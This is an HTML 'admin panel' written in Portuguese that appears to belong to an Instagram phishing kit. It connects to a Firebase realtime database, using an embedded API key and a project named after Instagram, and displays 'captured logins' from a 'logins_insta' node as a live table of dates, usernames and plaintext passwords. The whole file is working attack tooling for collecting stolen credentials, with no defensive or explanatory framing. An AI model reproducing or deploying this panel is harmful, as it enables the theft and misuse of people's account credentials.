<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Painel Admin - Captura</title>
    <style>
        body { font-family: sans-serif; background: #121212; color: #00ff00; padding: 20px; }
        table { width: 100%; border-collapse: collapse; background: #1e1e1e; }
        th, td { padding: 10px; border: 1px solid #333; text-align: left; }
        th { color: #0095f6; }
    </style>
</head>
<body>
    <h2>Logins Capturados</h2>
    <table>
        <thead>
            <tr>
                <th>Data</th>
                <th>Usuário</th>
                <th>Senha</th>
            </tr>
        </thead>
        <tbody id="lista"></tbody>
    </table>

    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database-compat.js"></script>
    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBKDt453P9yD56Td_-oURBWaOTdaukhuUo",
            authDomain: "instagram-3e2e5.firebaseapp.com",
            databaseURL: "https://instagram-3e2e5-default-rtdb.firebaseio.com",
            projectId: "instagram-3e2e5"
        };
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // Escuta o banco em tempo real
        database.ref('logins_insta').on('value', (snapshot) => {
            const lista = document.getElementById('lista');
            lista.innerHTML = "";
            snapshot.forEach((item) => {
                const d = item.val();
                lista.innerHTML += `<tr><td>${d.data}</td><td>${d.usuario}</td><td>${d.senha}</td></tr>`;
            });
        });
    </script>
</body>
</html>
